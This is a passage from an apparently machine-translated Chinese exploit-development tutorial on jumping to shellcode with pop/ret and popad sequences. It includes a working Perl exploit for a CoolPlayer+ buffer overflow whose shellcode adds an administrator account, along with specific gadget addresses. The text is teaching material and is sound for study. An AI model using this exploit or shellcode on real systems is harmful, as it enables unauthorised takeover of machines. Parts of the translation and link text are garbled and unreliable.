
![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_PKWAGF3W294828V.png)

我选择了第一个用作EIP覆盖的ntdll地址（`0x7C924961`）。如果双击该地址，则可以验证它是否确实指向我们所需的弹出式弹出式弹出式视频序列。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_AZ743CK7DJGFJSG.png)

让我们更新脚本，用这个地址替换我们当前的BBBB的EIP覆盖，然后重新运行漏洞来验证我们到达我们的shellcode占位符。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_M26DY5CPRQUSBNZ.png)

nice。正如你所看到的，我们已经成功地使用了pop pop pop ret序列来访问我们的shellcode。现在我们只需要用一些实际的shellcode替换INT指令并确保它执行。因为我在这个例子中使用了ESP，所以我们限制了shellcode的空间量，所以我们不使用迄今为止使用的calc.exe shellcode，而是使用稍微小一点的代码： `http： //95aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2^5M7r3I4G2K9i4c8Q4x3X3c8V1j5W2)9J5k6h3y4G2L8g2)9J5c8X3g2^5M7r3I4G2K9i4c8K6i4K6u0r3x3e0f1J5x3o6u0Q4x3V1k6Q4c8e0y4Q4z5o6m8Q4z5o6u0Q4c8e0S2Q4b7V1k6Q4z5e0W2Q4c8e0c8Q4b7U0S2Q4b7f1q4K6K9r3g2D9L8r3y4G2k6r3g2Q4c8e0c8Q4b7U0S2Q4z5p5c8Q4c8e0k6Q4z5e0S2Q4b7f1k6Q4c8e0g2Q4z5e0m8Q4b7f1k6Q4c8e0g2Q4z5p5q4Q4b7e0S2Q4c8e0S2Q4b7f1g2Q4b7e0q4Q4c8e0N6Q4b7f1g2Q4z5e0N6Q4c8e0g2Q4z5e0W2Q4b7e0S2Q4c8f1k6Q4b7V1y4Q4z5p5y4Q4c8e0S2Q4z5o6m8Q4z5p5y4Q4c8e0k6Q4z5e0S2Q4b7f1k6Q4c8e0k6Q4b7U0N6Q4b7V1u0Q4c8e0g2Q4z5p5q4Q4b7e0m8Q4c8e0c8Q4b7V1q4Q4z5o6k6Q4c8e0c8Q4b7U0S2Q4z5o6m8Q4c8e0c8Q4b7U0S2Q4b7f1q4Q4c8e0N6Q4b7f1g2Q4b7e0q4Q4c8e0N6Q4z5e0m8Q4z5o6k6Q4c8e0g2Q4z5e0q4Q4z5e0S2Q4c8e0N6Q4z5e0c8Q4b7e0S2Q4c8e0k6Q4z5o6S2Q4b7U0N6Q4c8e0y4Q4z5o6m8Q4z5o6u0Q4c8e0k6Q4z5o6S2Q4z5e0q4Q4c8e0c8Q4b7V1k6Q4b7f1g2Q4c8e0k6Q4z5e0c8Q4b7U0W2Q4c8e0c8Q4b7V1q4Q4z5o6k6Q4c8e0g2Q4z5p5g2Q4z5f1k6Q4c8e0g2Q4b7e0N6Q4z5p5u0Q4c8e0N6Q4z5f1q4Q4z5o6c8K6K9r3g2D9L8r3y4G2k6r3g2Q4c8f1k6Q4b7V1y4Q4z5p5y4Q4c8e0g2Q4z5o6S2Q4z5o6k6Q4c8e0g2Q4z5o6S2Q4b7f1u0Q4c8e0g2Q4b7U0m8Q4z5o6k6Q4c8e0N6Q4z5e0c8Q4b7e0S2Q4c8e0k6Q4z5o6S2Q4b7U0N6Q4c8e0g2Q4z5e0m8Q4z5p5c8Q4c8e0g2Q4z5e0u0Q4z5p5y4Q4c8e0g2Q4b7f1k6Q4z5o6k6Q4c8e0N6Q4b7e0m8Q4z5o6q4Q4c8e0k6Q4z5f1u0Q4b7U0c8Q4c8e0k6Q4z5e0c8Q4b7U0W2Q4c8e0c8Q4b7U0S2Q4b7V1q4J5x3o6m8@1i4@1f1#2i4K6V1J5i4K6S2o6M7s2N6F1k6q4!0q4x3#2)9^5x3q4)9^5x3W2!0q4z5q4!0n7c8W2)9&6z5g2!0q4y4W2)9&6z5q4!0m8c8W2!0q4z5q4!0n7c8W2)9&6z5g2!0q4y4q4!0n7z5q4!0m8b7g2!0q4y4W2!0n7b7#2)9&6y4q4!0q4y4#2!0m8y4q4!0n7b7g2!0q4z5q4)9^5y4q4)9&6b7g2!0q4y4W2)9&6b7#2!0m8b7#2!0q4y4#2)9&6b7g2)9^5y4q4!0q4y4W2)9&6b7#2)9^5x3q4!0q4y4#2!0n7b7W2)9^5z5q4!0q4y4#2)9^5z5g2)9^5z5q4!0q4y4W2)9&6b7#2!0m8b7#2!0q4c8W2!0n7b7#2)9&6b7b7``.

```perl
#!/usr/bin/perl

###########################################################################################

# Exploit Title: CoolPlayer+ Portable v2.19.4 - Local Buffer Overflow Shellcode Jump Demo

# Date: 12-24-2013

# Author: Mike Czumak (T_v3rn1x) -- @SecuritySift

# Vulnerable Software: CoolPlayer+ Portable v2.19.4

# Software Link: aa0K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8G2M7Y4c8S2j5X3I4W2j5i4m8H3M7#2)9J5k6h3y4G2L8g2)9J5c8X3q4H3M7s2y4Q4x3V1k6E0N6i4y4A6j5#2)9#2k6Y4k6A6k6r3g2G2i4K6u0r3j5$3!0G2L8s2m8D9j5i4W2W2M7Y4m8Q4y4h3k6H3L8%4u0@1j5h3u0D9k6b7``.

# Tested On: Windows XP SP3

# Based on original POC exploit: 4daK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2^5M7r3I4G2K9i4c8Q4x3X3c8V1j5W2)9J5k6h3y4G2L8g2)9J5c8X3g2^5M7r3I4G2K9i4c8K6i4K6u0r3y4o6R3K6z5g2)9J5c8R3``.

# Details: Demo of jumping to shellcode via pop/ret sequence to stack address

###########################################################################################



my $buffsize = 10000; # set consistent buffer size

my $junk = "\x4A" x 260; # simulate unusable address containing junk with 'J'

my $eip = pack('V',0x7C924961); # EIP overwrite w/ pop edi pop esi pop ebp from ntdll

my $junk2 = "\x4A" x 12; # simulate unusable address containing junk with 'J'

my $usable_address = pack('V',0x7C86467B); # jmp esp kernel32.dll

my $nops = "\x90" x 20;



# XP SP3 add admin user shellcode -- 107 bytes

# mod'd from original by Anastasios Monachos 1bfK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2^5M7r3I4G2K9i4c8Q4x3X3c8V1j5W2)9J5k6h3y4G2L8g2)9J5c8X3g2^5M7r3I4G2K9i4c8K6i4K6u0r3x3e0f1J5x3o6u0Q4x3V1j5``.

my $shell = "\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xad\x23" .

"\x86\x7c\xff\xd3\x31\xc0\x50\xbb\xfa\xca" .

"\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63" .

"\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20" .

"\x6e\x65\x74\x20\x75\x73\x65\x72\x20" .

"\x72\x30\x30\x74\x20" . # user: r00t

"\x70\x77\x6e\x64" . # pass: pwnd

"\x20\x2f\x61\x64\x64\x20\x26\x26\x20\x6e" .

"\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72" .

"\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e\x69" .

"\x73\x74\x72\x61\x74\x6f\x72\x73\x20".

"\x72\x30\x30\x74" .

"\x20\x2f\x61\x64\x64\x00";



my $sploit = $jmp.$junk.$eip.$junk2.$usable_address.$nops.$shell; # build sploit portion of buffer

my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer

my $buffer = $sploit.$fill; # build final buffer



# write the exploit buffer to file

my $file = "coolplayer.m3u";

open(FILE, "&gt;$file");

print FILE $buffer;

close(FILE);

print "Exploit file [" . $file . "] created\n";

print "Buffer size: " . length($buffer) . "\n";
```

让我们执行生成的m3u文件（从C：\）并验证exploit是否有效。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_2PSYVR5BD2R6AZN.png)

成功！！选择shellcode时要小心谨慎 - 绝对不要在生产环境中运行不受信任的shellcode！这相当于盲目地从不受信任的来源打开可执行文件。在我们讨论如何构建自定义shellcode之前，我们仍然有一些方法可以参考，我建议使用Metasploit来生成shellcode，或者如果您愿意，可以使用Exploit-DB上的shellcode。

### 3.POPAD

`popad`指令按照以下顺序将EDI，ESI，EBP，ESP，EDX，ECX和EAX（其中ESP被丢弃）简单地弹出堆栈前8个双字（4字节）并进入8个通用寄存器。您可以像使用弹出式视窗一样使用`popad`指令。比方说，例如，在应用程序崩溃时，您可以控制ESP + 32。找到弹出式弹出式弹出式弹出式弹出式视频序列不太可能。相反，您可以使用指向`popad + ret`指令的指针覆盖EIP，该指令将弹出堆栈前32个字节（8个dword）并执行堆栈顶部的下一个地址。为此，我们需要找到指向`popad + ret`序列的地址。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_3MBVCXMPKAG9GTS.png)

这会返回多个可能的OS模块地址 - 您可能会发现由于访问冲突，有些地址不会执行。我发现至少有一个从ntdll（`0x7C93121B`）开始工作。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_P2ZQQDGR7ZXJEHJ.png)

在下面的脚本中，我用这个地址替换了EIP。仅用于演示目的，我还修改了缓冲区以包含每个寄存器的值，以说明`popad`期间弹出寄存器的顺序。请注意，我制作了ESP + 32不可执行的INT指令来暂停执行并查看寄存器和堆栈的当前状态。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_GWUHW5XE5EAHRTB.png)

这里是结果寄存器和堆栈。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_N557XEBUYWB3S37.png)

如您所见，寄存器从EDI开始自下而上（并放弃ESP）。现在，如果我们替换INT指令ESP $用JMP ESP或致电ESP指令的地址，我们可以继续下面的shellcode的执行。由于我们在ESP中分配的空间有限，我再次选择了一个较小的shellcode示例，这次是一个简单的消息框来证明成功的利用。
